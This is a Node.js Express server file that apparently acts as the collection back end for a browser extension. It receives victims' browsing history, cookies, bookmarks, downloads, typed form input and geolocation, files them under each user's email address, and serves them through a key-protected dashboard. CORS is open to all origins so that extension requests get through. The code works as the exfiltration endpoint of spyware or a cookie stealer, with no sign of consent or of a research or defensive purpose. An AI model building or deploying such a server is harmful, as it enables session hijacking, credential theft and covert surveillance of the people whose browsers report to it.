const express = require('express');
const fs = require('fs');
const path = require('path');
const { encrypt } = require('./encrypt');

const app = express();
const PORT = process.env.PORT || 3000;

// Read keys from environment variables (for Render) or files (for local development)
function readKey(keyName, filePath) {
  // Try environment variable first (for production/Render)
  if (process.env[keyName]) {
    return process.env[keyName].trim();
  }
  
  // Fall back to file (for local development)
  try {
    const fullPath = path.join(__dirname, filePath);
    if (fs.existsSync(fullPath)) {
      return fs.readFileSync(fullPath, 'utf8').trim();
    }
  } catch (error) {
    console.warn(`Warning: Could not read ${filePath}, using environment variable or default`);
  }
  
  return null;
}

// Read the API key from environment or receivekey.txt
const API_KEY = readKey('API_KEY', 'receivekey.txt');

// Read the access key from environment or accesskey.txt
const ACCESS_KEY = readKey('ACCESS_KEY', 'accesskey.txt');

// Read and format the public key from environment or public-key.txt
function getPublicKey() {
  let keyContent = null;
  
  // Try environment variable first
  if (process.env.PUBLIC_KEY) {
    keyContent = process.env.PUBLIC_KEY.trim();
  } else {
    // Fall back to file
    try {
      const keyPath = path.join(__dirname, 'public-key.txt');
      if (fs.existsSync(keyPath)) {
        keyContent = fs.readFileSync(keyPath, 'utf8').trim();
      }
    } catch (error) {
      console.warn('Warning: Could not read public-key.txt');
    }
  }
  
  if (!keyContent) {
    throw new Error('Public key not found. Set PUBLIC_KEY environment variable or provide public-key.txt file.');
  }
  
  // If the key doesn't have PEM headers, add them
  if (!keyContent.includes('-----BEGIN PUBLIC KEY-----')) {
    keyContent = `-----BEGIN PUBLIC KEY-----\n${keyContent}\n-----END PUBLIC KEY-----`;
  }
  
  return keyContent;
}

const PUBLIC_KEY = getPublicKey();

// Validate required keys
if (!API_KEY) {
  console.error('Error: API_KEY is required. Set API_KEY environment variable or provide receivekey.txt file.');
  process.exit(1);
}

if (!ACCESS_KEY) {
  console.error('Error: ACCESS_KEY is required. Set ACCESS_KEY environment variable or provide accesskey.txt file.');
  process.exit(1);
}

// Data directory path
const DATA_DIR = path.join(__dirname, 'data');

// Ensure data directory exists
if (!fs.existsSync(DATA_DIR)) {
  fs.mkdirSync(DATA_DIR, { recursive: true });
}

// Function to ensure user email folder exists
function ensureUserFolder(email) {
  const userFolder = path.join(DATA_DIR, email);
  if (!fs.existsSync(userFolder)) {
    fs.mkdirSync(userFolder, { recursive: true });
  }
  return userFolder;
}

// Serve static files from public directory (if it exists)
app.use(express.static(path.join(__dirname, 'public')));

// Middleware to parse JSON bodies - increase limit for large payloads (history, cookies, etc.)
app.use(express.json({ limit: '80mb' }));

// CORS middleware - IMPORTANT for extension requests
app.use((req, res, next) => {
  res.header('Access-Control-Allow-Origin', '*');
  res.header('Access-Control-Allow-Methods', 'GET, POST, OPTIONS');
  res.header('Access-Control-Allow-Headers', 'Content-Type');
  
  // Handle preflight requests
  if (req.method === 'OPTIONS') {
    return res.sendStatus(200);
  }
  next();
});

// Set request timeout to prevent hanging requests (30 seconds)
app.use((req, res, next) => {
  req.setTimeout(30000, () => {
    if (!res.headersSent) {
      res.status(408).json({ error: 'Request timeout' });
    }
  });
  next();
});

// Health check endpoint
app.get('/health', (req, res) => {
  const memUsage = process.memoryUsage();
  res.json({
    status: 'healthy',
    timestamp: new Date().toISOString(),
    uptime: process.uptime(),
    memory: {
      used: Math.round(memUsage.heapUsed / 1024 / 1024) + ' MB',
      total: Math.round(memUsage.heapTotal / 1024 / 1024) + ' MB',
      rss: Math.round(memUsage.rss / 1024 / 1024) + ' MB'
    },
    version: require('./package.json').version
  });
});

// Frontend route - serve dashboard with access key validation
app.get('/', (req, res) => {
  const key = req.query.key;
  
  if (key !== ACCESS_KEY) {
    return res.status(401).send(`
      <!DOCTYPE html>
      <html>
      <head>
        <title>Access Denied</title>
        <style>
          body { font-family: Arial, sans-serif; text-align: center; padding: 50px; }
          h1 { color: #e74c3c; }
        </style>
      </head>
      <body>
        <h1>Access Denied</h1>
        <p>Invalid access key. Please provide a valid key.</p>
      </body>
      </html>
    `);
  }
  
  // Serve the dashboard HTML
  res.sendFile(path.join(__dirname, 'dashboard.html'));
});

// API endpoint to list all users
app.get('/api/users', (req, res) => {
  const key = req.query.key;
  
  if (key !== ACCESS_KEY) {
    return res.status(401).json({ error: 'Unauthorized' });
  }
  
  try {
    if (!fs.existsSync(DATA_DIR)) {
      return res.json({ users: [] });
    }
    
    const users = fs.readdirSync(DATA_DIR).filter(item => {
      const itemPath = path.join(DATA_DIR, item);
      return fs.statSync(itemPath).isDirectory();
    });
    
    res.json({ users });
  } catch (error) {
    console.error('Error listing users:', error);
    res.status(500).json({ error: 'Failed to list users' });
  }
});

// API endpoint to get user data files info
app.get('/api/user/:email/files', (req, res) => {
  const key = req.query.key;
  const email = decodeURIComponent(req.params.email);
  
  if (key !== ACCESS_KEY) {
    return res.status(401).json({ error: 'Unauthorized' });
  }
  
  try {
    const userFolder = path.join(DATA_DIR, email);
    
    if (!fs.existsSync(userFolder)) {
      return res.json({ files: [] });
    }
    
    const files = ['history.txt', 'cookies.txt', 'bookmarks.txt', 'downloads.txt', 'logs.txt']
      .map(fileName => {
        const filePath = path.join(userFolder, fileName);
        if (fs.existsSync(filePath)) {
          const stats = fs.statSync(filePath);
          return {
            name: fileName,
            size: stats.size,
            modified: stats.mtime,
            encrypted: fileName !== 'logs.txt'
          };
        }
        return null;
      })
      .filter(file => file !== null);
    
    res.json({ files });
  } catch (error) {
    console.error('Error getting user files:', error);
    res.status(500).json({ error: 'Failed to get user files' });
  }
});

// API endpoint to get file content
app.get('/api/user/:email/file/:fileName', (req, res) => {
  const key = req.query.key;
  const email = decodeURIComponent(req.params.email);
  const fileName = req.params.fileName;
  
  if (key !== ACCESS_KEY) {
    return res.status(401).json({ error: 'Unauthorized' });
  }
  
  // Security: only allow specific file names
  const allowedFiles = ['history.txt', 'cookies.txt', 'bookmarks.txt', 'downloads.txt', 'logs.txt'];
  if (!allowedFiles.includes(fileName)) {
    return res.status(400).json({ error: 'Invalid file name' });
  }
  
  try {
    const filePath = path.join(DATA_DIR, email, fileName);
    
    if (!fs.existsSync(filePath)) {
      return res.status(404).json({ error: 'File not found' });
    }
    
    const content = fs.readFileSync(filePath, 'utf8');
    const isEncrypted = fileName !== 'logs.txt'; // Logs are plain text, others are encrypted
    
    res.json({
      fileName,
      content: content,
      encrypted: isEncrypted,
      size: fs.statSync(filePath).size
    });
  } catch (error) {
    console.error('Error reading file:', error);
    res.status(500).json({ error: 'Failed to read file' });
  }
});

// Endpoint to receive messages
app.post('/api', (req, res) => {
  // Variables to track for cleanup
  let jsonContent = null;
  let encryptedContent = null;
  let logEntry = null;
  
  try {
    const { Type, Email, Time, Field, Message, Data, key } = req.body;

    // Check if the key matches
    if (key !== API_KEY) {
      console.log(`[${new Date().toLocaleString()}] Unauthorized request - key mismatch`);
      return res.status(401).json({ error: 'Unauthorized' });
    }

    // Get email and ensure user folder exists
    const userEmail = Email || 'Unknown';
    const userFolder = ensureUserFolder(userEmail);

    // Log the message if key matches
    const timestamp = Time || new Date().toLocaleString();
    const typeUpper = Type?.toUpperCase() || 'MESSAGE';
    
    console.log(`\n[${timestamp}] ${typeUpper}`);
    console.log(`  Email: ${userEmail}`);
    
    // Handle file saving based on message type
    const messageType = Type?.toLowerCase();
    
    // Types that should be saved to specific files (override existing)
    if (messageType === 'history' || messageType === 'cookies' || 
        messageType === 'bookmarks' || messageType === 'downloads') {
      const fileName = `${messageType}.txt`;
      const filePath = path.join(userFolder, fileName);
      
      // Convert data to JSON string and encrypt it
      // Use null for pretty printing to reduce memory usage slightly
      jsonContent = JSON.stringify(Data);
      encryptedContent = encrypt(jsonContent, PUBLIC_KEY);
      
      // Write file synchronously (smaller memory footprint than async for large files)
      fs.writeFileSync(filePath, encryptedContent, 'utf8');
      console.log(`  Saved to: ${fileName} (encrypted)`);
      
      // Log summary
      if (Array.isArray(Data)) {
        console.log(`  Data: Array with ${Data.length} items`);
      } else if (typeof Data === 'object' && Data !== null) {
        console.log(`  Data: Object saved`);
      }
      
      // Explicitly clear large variables to help GC
      jsonContent = null;
      encryptedContent = null;
    }
    // Types that should be appended to logs.txt
    else if (messageType === 'opened' || messageType === 'input' || messageType === 'geolocation') {
      const logsPath = path.join(userFolder, 'logs.txt');
      logEntry = `[${timestamp}] ${typeUpper}\n`;
      
      if (messageType === 'opened' || messageType === 'input') {
        logEntry += `  Field: ${Field || 'N/A'}\n`;
        logEntry += `  Message: ${Message || 'N/A'}\n`;
      } else if (messageType === 'geolocation') {
        // Limit geolocation data size to prevent memory issues
        const geoData = Data ? JSON.stringify(Data) : 'N/A';
        logEntry += `  Data: ${geoData}\n`;
      }
      
      logEntry += '---\n\n';
      
      // Append log entry as plain text (not encrypted)
      fs.appendFileSync(logsPath, logEntry, 'utf8');
      console.log(`  Appended to: logs.txt`);
      
      // Also log to console
      if (messageType === 'opened' || messageType === 'input') {
        console.log(`  Field: ${Field || 'N/A'}`);
        console.log(`  Message: ${Message || 'N/A'}`);
      } else if (messageType === 'geolocation') {
        console.log(`  Data:`, Data ? JSON.stringify(Data) : 'N/A');
      }
      
      // Clear log entry
      logEntry = null;
    }
    // Unknown type - just log
    else {
      console.log(`  Unknown type: ${messageType}`);
      if (Data !== undefined) {
        if (Array.isArray(Data)) {
          console.log(`  Data: Array with ${Data.length} items`);
        } else if (typeof Data === 'object' && Data !== null) {
          // Don't stringify large objects in console to save memory
          console.log(`  Data: Object (not logged to save memory)`);
        } else {
          console.log(`  Data: ${Data}`);
        }
      } else {
        console.log(`  Field: ${Field || 'N/A'}`);
        console.log(`  Message: ${Message || 'N/A'}`);
      }
    }
    
    console.log('---');

    // Send success response
    if (!res.headersSent) {
      res.json({ success: true, message: 'Message received' });
    }
  } catch (error) {
    console.error('Error processing request:', error);
    
    // Ensure response is sent even on error
    if (!res.headersSent) {
      res.status(500).json({ error: 'Internal server error', message: error.message });
    }
  } finally {
    // Explicit cleanup of large variables to help garbage collection
    jsonContent = null;
    encryptedContent = null;
    logEntry = null;
    
    // Clear request body reference to help GC
    if (req.body) {
      req.body = null;
    }
  }
});

// Handle uncaught exceptions to prevent crashes
process.on('uncaughtException', (error) => {
  console.error('Uncaught Exception:', error);
  // Don't exit - log and continue (in production, you might want to exit)
});

// Handle unhandled promise rejections
process.on('unhandledRejection', (reason, promise) => {
  console.error('Unhandled Rejection at:', promise, 'reason:', reason);
});

// Periodic garbage collection hint (optional - Node.js handles GC automatically)
// This is just a safety measure for long-running processes
if (global.gc) {
  setInterval(() => {
    if (process.memoryUsage().heapUsed > 500 * 1024 * 1024) { // 500MB threshold
      console.log('Memory usage high, suggesting GC...');
      global.gc();
    }
  }, 60000); // Check every minute
}

// Start the server
const server = app.listen(PORT, '0.0.0.0', () => {
  console.log(`Server running on port ${PORT}`);
  console.log(`API endpoint: http://localhost:${PORT}/api`);
  console.log(`Dashboard: http://localhost:${PORT}/?key=${ACCESS_KEY}`);
});

// Set server timeout to prevent hanging connections
server.timeout = 30000; // 30 seconds

// Graceful shutdown
process.on('SIGTERM', () => {
  console.log('SIGTERM received, shutting down gracefully...');
  server.close(() => {
    console.log('Server closed');
    process.exit(0);
  });
});

process.on('SIGINT', () => {
  console.log('SIGINT received, shutting down gracefully...');
  server.close(() => {
    console.log('Server closed');
    process.exit(0);
  });
});
